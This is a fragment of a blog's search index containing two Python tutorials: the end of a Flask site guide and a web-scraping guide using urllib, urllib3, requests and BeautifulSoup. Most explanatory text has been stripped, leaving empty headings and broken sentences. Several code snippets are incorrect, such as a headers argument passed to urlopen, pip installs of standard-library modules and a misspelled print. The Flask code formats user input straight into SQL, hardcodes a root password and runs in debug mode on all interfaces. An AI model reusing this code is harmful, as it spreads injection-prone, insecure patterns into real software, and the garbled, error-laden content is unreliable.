class="title function_">num_user</span>(<span class="params">namea</span>):</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    db = MySQLdb.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;air123456&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;web&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># cursor()</span></span><br><span class="line">    cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SQL </span></span><br><span class="line">    sql = <span class="string">&quot;SELECT * FROM users WHERE name = &#x27;%s&#x27;&quot;</span> % (namea)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># sql</span></span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    db.commit()</span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    ida = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> results:</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        ida = row[<span class="number">0</span>]</span><br><span class="line">    db.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>,  debug=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># db.close()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ###</span></span><br><span class="line"><span class="comment"># CREATE TABLE IF NOT EXISTS `users`(</span></span><br><span class="line"><span class="comment">#         `uid` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">#         `name` VARCHAR(100) NOT NULL,</span></span><br><span class="line"><span class="comment">#     `udate` DATE NOT NULL,</span></span><br><span class="line"><span class="comment">#         PRIMARY KEY ( `uid` )</span></span><br><span class="line"><span class="comment">#      )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span></span><br><span class="line"><span class="comment">#       ALTER TABLE users ADD unique(`name`)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ###</span></span><br></pre></td></tr></table></figure><h3 id="4-8-"><a href="#4-8-" class="headerlink" title="4.8 "></a>4.8 </h3><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python run.py</span><br></pre></td></tr></table></figure><p><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-14.png" alt=""></p><center>--END--</center>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Html,Js,Css </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonurllib/urllib3/requests+beautifulsoup</title>
      <link href="/2020/01/06/Python%E4%BD%BF%E7%94%A8urllib,urllib3,requests%E5%BA%93+beautifulsoup%E7%88%AC%E5%8F%96%E7%BD%91%E9%A1%B5/"/>
      <url>/2020/01/06/Python%E4%BD%BF%E7%94%A8urllib,urllib3,requests%E5%BA%93+beautifulsoup%E7%88%AC%E5%8F%96%E7%BD%91%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>python 3.8.1</p></blockquote><h2 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h2><p>urllibURL<br>urllibrequestURLGETHTTP</p><p>pip:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install urllib</span><br></pre></td></tr></table></figure><p>(<a href="http://www.baidu.com/">www.baidu.com</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html, application/xhtml+xml, */*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/6.1 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.so.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.so.com&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    respond = urllib.request.urlopen(<span class="string">&#x27;http://www.baidu.com&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(respond.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>:<br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1019223241745024"></a></p><h2 id="urllib3"><a href="#urllib3" class="headerlink" title="urllib3"></a>urllib3</h2><p>urllib3Python HTTPPythonurllib3urllib3Python</p><p><br><br>SSL &#x2F; TLS<br><br>HTTP<br>gzipdeflatebrotli<br>HTTPSOCKS<br>100<br>urllib3<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install urllib3</span><br></pre></td></tr></table></figure><p>(<a href="http://www.baidu.com/">www.baidu.com</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    http = urllib3.PoolManager()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html, application/xhtml+xml, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/6.1 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=http.request(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.baidu.com&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(r.data)</span><br></pre></td></tr></table></figure><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><p>Pythonurlliburllib3</p><p>requestsPythonURL<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p> <strong>s</strong> &#x3D;&#x3D;requests&#x3D;&#x3D;</p><p>360:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    keyword = <span class="string">&quot;123sad&quot;</span></span><br><span class="line">    keyword = <span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      <span class="comment">#headerschromeF12Network</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html, application/xhtml+xml, */*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/6.1 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.so.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.so.com&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">        <span class="comment">#GET</span></span><br><span class="line">        kv = &#123;<span class="string">&#x27;q&#x27;</span>: keyword, <span class="string">&#x27;ie&#x27;</span>: <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;pn&#x27;</span>: page&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># requests.ReadTimeout(60)</span></span><br><span class="line">        r = requests.get(<span class="string">&quot;http://www.so.com/s&quot;</span>, headers=headers,</span><br><span class="line">                         params=kv)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;url:&#x27;</span>+r.request.url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        html = r.text</span><br><span class="line">        <span class="built_in">print</span>(html)</span><br><span class="line">    <span class="keyword">except</span> requests.HTTPError <span class="keyword">as</span> a:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1183249464292448"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="1-"><a href="#1-" class="headerlink" title="1."></a>1.</h3><p>vs code <br>cmd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xxx.py</span><br></pre></td></tr></table></figure><h3 id="2-"><a href="#2-" class="headerlink" title="2."></a>2.</h3><p>IP<br>(proxy)360</p><h3 id="3-"><a href="#3-" class="headerlink" title="3."></a>3.</h3><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="urllib-1"><a href="#urllib-1" class="headerlink" title="urllib"></a>urllib</h3><h4 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h4><p>parse</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;<span class="string">&#x27;ie&#x27;</span>: <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;wd&#x27;</span>: <span class="string">&#x27;python&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;www.baidu.com/s?&#x27;</span>+urllib.parse.urlencode(params)</span><br><span class="line"><span class="built_in">print</span>(url)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com/s?ie=utf-8&amp;wd=python%E6%98%AF%E8%BF%99%E4%B8%AA%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80</span><br></pre></td></tr></table></figure><h4 id="error"><a href="#error" class="headerlink" title="error"></a>error</h4><p>urllibURLErrorHTTPError</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">...</span><br><span class="line"><span class="keyword">except</span> urllib.error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e.code)<span class="comment">#</span></span><br><span class="line">    <span class="built_in">print</span>(e.reason)<span class="comment">#</span></span><br><span class="line">    pring(e.headers)<span class="comment">#</span></span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><p>re<br>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install re</span><br></pre></td></tr></table></figure><p>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(</span><br><span class="line">            <span class="string">r&#x27;&lt;li class=&quot;res-list&quot; data-lazyload=&quot;1&quot;&gt;&lt;h3 class=&quot;res-title &quot;&gt;&lt;a href=&quot;(.*?)&quot;&#x27;</span>, re.S)</span><br><span class="line">        results = pattern.findall(html)</span><br></pre></td></tr></table></figure><p>,<em>re.compile</em>,<em>findall</em><br><a href="https://docs.python.org/zh-cn/3/library/re.html"></a></p><blockquote><p>requests</p></blockquote><h2 id="beautifulsoup"><a href="#beautifulsoup" class="headerlink" title="beautifulsoup"></a>beautifulsoup</h2><p>Beautiful Soup HTMLXMLPython.,,.Beautiful Soup.<br>pip:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install bs4</span><br></pre></td></tr></table></figure><p><code>lxml</code><a href="https://www.cnblogs.com/lvdongjie/p/11286599.html"></a><code>html</code></p><p>beautifulsouphtml:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(req.text, <span class="string">&quot;html&quot;</span>)</span><br><span class="line"><span class="comment">#reqresquests</span></span><br><span class="line">soup.find(name=<span class="string">&quot;div&quot;</span>, attrs=&#123;<span class="string">&quot;class&quot;</span> :<span class="string">&quot;a&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;b&quot;</span>&#125;)</span><br><span class="line"><span class="comment">#&lt;div class=&quot;a&quot; id=&quot;b&quot;&gt;</span></span><br><span class="line">soup.select(<span class="string">&quot;.a&quot;</span>)</span><br><span class="line"><span class="comment">#class=&quot;a&quot;,# .</span></span><br><span class="line">human_list=beautifulsoup(<span class="string">&quot;&lt;p class=&#x27;a&#x27;&gt;&lt;/p&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(human_list.p[<span class="string">&quot;class&quot;</span>])<span class="comment"># a</span></span><br></pre></td></tr></table></figure><p>html<code>xx.string</code>.text<br><a href="http://www.jsphp.net/python/show-24-214-1.html"></a><br><a href="https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/"></a></p><h2 id=""><a href="#" class="headerlink" title=":"></a>:</h2><p><code>https://www.baidu.com/s?ie=UTF-8&amp;wd=afs</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.baidu.com/s?ie=UTF-8&amp;wd=afs&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">req = requests.get(url, headers=headers)</span><br><span class="line"><span class="comment">#soup = BeautifulSoup(req.text, &quot;lxml&quot;)#lxml</span></span><br><span class="line">soup = BeautifulSoup(req.text, <span class="string">&quot;html&quot;</span>)<span class="comment">#html</span></span><br><span class="line">human_list=soup.find(name=<span class="string">&quot;div&quot;</span>, attrs=&#123;<span class="string">&quot;class&quot;</span> :<span class="string">&quot;c-abstract&quot;</span>&#125;)</span><br><span class="line">human_list=<span class="built_in">str</span>(human_list)</span><br><span class="line">human_list=human_list.replace(<span class="string">&#x27;&lt;div class=&quot;c-abstract c-abstract-en&quot;&gt;&#x27;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">human_list=human_list.replace(<span class="string">&quot;&lt;/div&gt;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">human_list=human_list.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(human_list)</span><br></pre></td></tr></table></figure><p>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>AFS<span class="tag">&lt;/<span class="name">em</span>&gt;</span> study abroad, education and volunteer programs empower people of all ages and backgrounds with essential intercultural knowledge, skills and understanding.</span><br></pre></td></tr></table></figure><center><b>END</b></center>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Web crawler </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
